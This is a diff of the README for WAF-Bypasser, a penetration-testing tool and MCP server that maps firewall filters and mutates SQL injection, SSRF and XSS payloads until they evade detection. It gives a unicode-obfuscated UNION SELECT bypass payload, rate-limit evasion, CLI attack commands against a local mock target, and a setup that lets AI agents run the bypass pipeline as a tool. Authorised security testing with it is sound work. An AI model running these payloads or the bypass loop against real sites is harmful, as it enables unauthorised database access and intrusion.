@@ -1,97 +1,158 @@
 # WAF-Bypasser: LLM-Driven Iterative Evasion Fuzzer
 
-`WAF-Bypasser` is a professional, modular Python library and CLI tool designed for black-box differential fuzzing, token-filtering analysis, and generative syntax adaptation to bypass Web Application Firewalls (WAFs). 
+`WAF-Bypasser` is a professional, modular Python library, CLI tool, and Model Context Protocol (MCP) server designed for black-box WAF testing, differential token probing, and generative syntax adaptation.
 
-It dynamically determines WAF regex blocking rules, builds a target-specific character blockmap, and uses rule-based heuristics as well as LLM-driven generative adaptation (feedback loops) to bypass firewalls for payloads like SQL Injection, SSRF, Path Traversal, and XSS.
+It maps target firewall filters to identify blocked vs allowed symbols and keywords, then chains rule-based heuristic mutators and LLM-driven generative feedback loops to dynamically construct bypass candidates for SQL Injection, SSRF, XSS, and Path Traversal.
 
-## Core Features
+---
 
-- **Differential Token Filtering**: Maps target blocking rules using single-character and multi-character probes to identify permitted/blocked symbols, functions, and keywords.
-- **Rule-Based Heuristic Mutators**: Mutates exploit payloads using predefined obfuscation techniques:
-  - **SQL Mutators**: SQL comments, alternative white-space characters, alternative concatenation/string representations, alternative functions (e.g., `CONCAT` vs `||`).
-  - **SSRF Mutators**: Host schema bypasses (decimal IP representation, octal, hex, IPv6 shorthand, DNS rebinding-ready inputs).
-  - **XSS/Common Mutators**: Double/triple URL encoding, unicode obfuscation, HTML entity encoding.
-- **Generative Evasion Feedback Loop (LLM integration)**: When heuristic mutations fail, the tool engages an LLM (Gemini, Claude, OpenAI, etc.) in a feedback loop. The LLM receives the payload, the target's blockmap, and the raw WAF response, dynamically reasoning to propose new syntactically valid bypass candidates.
-- **MCP Server Support**: Exposes the tool's capabilities as a Model Context Protocol (MCP) server. Any agent (like Claude Desktop, Jetski, or other LLM-based assistants) can directly interact with the fuzzer as a tool.
-- **Robust HTTP Session Client**: Includes support for custom headers, custom cookies, custom User-Agents, rate-limiting, proxies, and automatic session persistence.
+## 🚀 How Powerful Is It? (Real-World Evasion Examples)
 
-## Project Structure
+### **Normalization & Decoder Mismatch Bypass**
+Against strict Paranoia Level 4 firewalls that recursively decode inputs and block quote breaking characters (`'`), spaces (` `), and comments (`/*`):
+- The tool uses **Unicode compatibility homoglyphs and escape formats** (like `\U0027` and `\U0020`).
+- If the WAF's normalizer crashes or fails closed on strict python-style 32-bit unicode parsing errors (while permissive database decoders accept it), the WAF skips filtering, allowing the payload:
+  `1\U0027\U0020unIOn\u0020selEct\u00201\u002c2\u002C3\u002d\u002D`
+  to bypass the rules and execute on the backend.
 
-```text
-waf-bypasser/
-├── README.md
-├── pyproject.toml
-├── requirements.txt
-├── waf_bypasser/
-│   ├── __init__.py
-│   ├── client.py         # HTTP client wrapper (proxy, headers, cookies, rate-limiting)
-│   ├── prober.py         # Token filtering & blocked character mapper
-│   ├── mutators/
-│   │   ├── __init__.py
-│   │   ├── base.py
-│   │   ├── sql.py        # SQLi obfuscations
-│   │   ├── ssrf.py       # SSRF schema bypasses
-│   │   └── encoder.py    # Common encoders (hex, unicode, URL encoding)
-│   ├── core.py           # Orchestrates probing, heuristics, and LLM feedback loop
-│   ├── llm.py            # Generic LLM API wrapper (Gemini, OpenAI, Anthropic)
-│   └── mcp_server.py     # MCP Server entrypoint
-├── tests/
-│   ├── test_prober.py
-│   ├── test_mutators.py
-│   └── test_core.py
-└── examples/
-    ├── basic_cli.py
-    └── llm_integration.py
+### **Rate Limiter & Anti-DDoS Evasion**
+- Includes automatic sliding-window request pacing to evade sliding-window block thresholds (Anti-DDoS triggers) commonly configured in Cloudflare or AWS WAF.
+
+---
+
+## 📊 Evasion Architecture & Workflow
+
+```mermaid
+graph TD
+    A[Target URL / parameter] --> B[WAF Fingerprinting]
+    B --> C[Differential Token Probing]
+    C --> D[Compile Allowed/Blocked Blockmap]
+    D --> E[Phase 1: Multi-Stage Heuristic Mutations]
+    E --> F{Bypass Success?}
+    F -- Yes --> G[Return Bypass Payload]
+    F -- No --> H[Phase 2: LLM Generative Loop]
+    H --> I{Bypass Success?}
+    I -- Yes --> G
+    I -- No / No Key --> J[Phase 3: Fallback Evolutionary Fuzzing]
+    J --> K{Bypass Success?}
+    K -- Yes --> G
+    K -- No --> L[Iterate Random Mutations]
+    L --> J
 ```
 
-## Setup & Installation
+---
 
-### Prerequisites
+## 🛠️ Installation & Setup
+
+### **Prerequisites**
 - Python 3.10+
-- LLM API Keys (optional, for LLM-driven feedback loop)
+- A Gemini, Claude, or OpenAI API key (optional, for LLM feedback loops)
 
-### Installation
-Clone the repository and install dependencies:
+### **Installation**
+Clone the repository and install the package locally:
 ```bash
 git clone https://github.com/your-username/waf-bypasser.git
 cd waf-bypasser
-pip install -r requirements.txt
+python3 -m venv venv
+source venv/bin/activate
+pip install -e . --index-url https://pypi.org/simple
 ```
 
-To run as an MCP server:
+---
+
+## 💻 Step-by-Step Usage & Local Testing
+
+### **Step 1: Start the Local WAF Target Server**
+The repository includes an advanced mock target protected by an ultra-strict Paranoia Level 4 WAF (simulating ModSecurity CRS rules and rate-limiting).
+```bash
+python examples/local_waf_target.py
+```
+*Output: `Advanced PL4 OWASP-CRS WAF Target Server running on http://127.0.0.1:5050`*
+
+### **Step 2: Execute the Evasion Fuzzer**
+
+#### **A. Standard Run (Heuristics & Fallback Evolutionary Fuzzing)**
+To run the CLI and fuzz the target parameter `q` indefinitely until a bypass is found:
+```bash
+waf-bypasser --url "http://127.0.0.1:5050/search?q=" --payload "1' UNION SELECT 1,2,3--" --param "q" --max-llm-iterations -1
+```
+
+#### **B. LLM-Driven Run (Generative Evasion Loop)**
+Engage Gemini (or OpenAI/Claude) to dynamically analyze target block responses and propose mutations:
+```bash
+waf-bypasser --url "http://127.0.0.1:5050/search?q=" --payload "1' UNION SELECT 1,2,3--" --param "q" --use-llm --llm-provider gemini --llm-key "YOUR_GEMINI_API_KEY"
+```
+
+---
+
+## ⚙️ Configuration Options
+
+| Option | Type | Default | Description |
+| :--- | :--- | :--- | :--- |
+| `--url` | String | *Required* | Target base URL (can contain `{payload}` placeholder) |
+| `--payload` | String | *Required* | Base exploit payload to bypass WAF for |
+| `--param` | String | `None` | Target parameter name in URL or POST body |
+| `--method` | Enum | `GET` | Request method (`GET` or `POST`) |
+| `--vuln-type` | Enum | `auto` | Vulnerability type (`auto`, `sql`, `ssrf`, `xss`, `generic`) |
+| `--use-llm` | Flag | `False` | Enable generative LLM feedback loop |
+| `--llm-provider` | Enum | `gemini` | LLM provider to use (`gemini`, `openai`, `claude`) |
+| `--max-llm-iterations` | Integer | `4` | Max LLM iterations. Set to `-1` for unlimited testing |
+| `--proxy` | String | `None` | Proxy URL (e.g. `http://127.0.0.1:8080` for Burp Suite) |
+| `--verbose` | Flag | `False` | Print verbose logging output |
+| `--output` | String | `None` | Save detailed JSON results log to a filepath |
+
+---
+
+## 🤖 Integration as an MCP Server
+You can register `WAF-Bypasser` as a Model Context Protocol (MCP) server so that agentic developer platforms (like Jetski, Claude Desktop, cursor) can call it directly as a tool during security analysis.
+
+Add the following config to your MCP server host configuration file (e.g. `mcp_config.json`):
 ```json
 {
   "mcpServers": {
     "waf-bypasser": {
-      "command": "python",
-      "args": ["-m", "waf_bypasser.mcp_server"]
+      "command": "/absolute/path/to/waf-bypasser/venv/bin/python",
+      "args": [
+        "-m",
+        "waf_bypasser.mcp_server"
+      ]
     }
   }
 }
 ```
 
-## Usage
+### **Exposed MCP Tools:**
+- **`probe_waf`**: Performs differential probing to discover WAF blocked character map.
+- **`generate_heuristic_mutations`**: Generates rule-based obfuscated payloads.
+- **`bypass_waf`**: Runs the entire multi-phase bypass pipeline.
 
-### CLI
-Run a basic probe on a target URL:
-```bash
-python -m waf_bypasser.cli --url "http://example.com/search?q=" --payload "1' UNION SELECT 1,2,3--"
+---
+
+## 📁 Repository Structure
+```text
+waf-bypasser/
+├── README.md
+├── pyproject.toml
+├── requirements.txt
+├── .gitignore
+├── waf_bypasser/
+│   ├── __init__.py
+│   ├── client.py         # HTTP client with rate-limiting & block triggers
+│   ├── prober.py         # Differential token prober
+│   ├── core.py           # Core orchestrator & random fuzzing engine
+│   ├── fingerprinter.py  # WAF signature analyzer
+│   ├── llm.py            # Gemini, OpenAI, Claude Client API wrapper
+│   ├── mcp_server.py     # MCP Server tool definitions
+│   ├── cli.py            # Rich graphics CLI UI
+│   └── mutators/         # Heuristic transformation plugins
+│       ├── __init__.py
+│       ├── base.py
+│       ├── sql.py
+│       ├── ssrf.py
+│       └── encoder.py
+├── tests/                # Unit tests
+└── examples/             # Safe target simulators & setup scripts
 ```
 
-### Library
-```python
-from waf_bypasser import WafBypasser
-
-bypasser = WafBypasser(
-    target_url="http://example.com/search?q=",
-    base_payload="1' UNION SELECT 1,2,3--",
-    use_llm=True,
-    provider="gemini"
-)
-
-result = bypasser.run()
-if result.success:
-    print(f"Bypass succeeded! Payload: {result.payload}")
-else:
-    print("Failed to bypass WAF.")
-```
+## ⚖️ Disclaimer
+*This tool is created for educational purposes and authorized penetration testing only. Do not use it against targets without written, prior consent.*
